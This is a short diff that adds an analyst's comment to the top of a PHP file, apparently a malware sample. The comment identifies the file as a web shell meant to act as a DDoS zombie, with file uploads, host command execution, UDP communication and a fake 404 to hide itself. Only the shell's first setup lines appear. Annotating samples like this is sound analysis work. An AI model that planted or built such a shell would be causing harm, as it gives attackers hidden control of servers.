@@ -1,4 +1,16 @@
-<?php
+/*
+ *
+ *	This webshell's main purpose is to be used as a zobie during a DDoS attack.
+ *	Allows for file uploads,
+ *	allows for quick stopping of a ping based DoS (which presumably use files that will be deleted after the attack is stopped),
+ *	commonucates on port 11 / UDP (I presume this allows on some unixes to list currently active users),
+ *	builds a link to itself (I'm not sure why is that useful),
+ *	allows for command execution on the host,
+ *	it tries to hide itself by faking a 404 response from the server,
+ *	it also allows to benchmark apache's performance.
+ *
+ */
+ <?php
 @set_time_limit(0);
 @error_reporting(0);
 $base = dirname(__FILE__)."/";
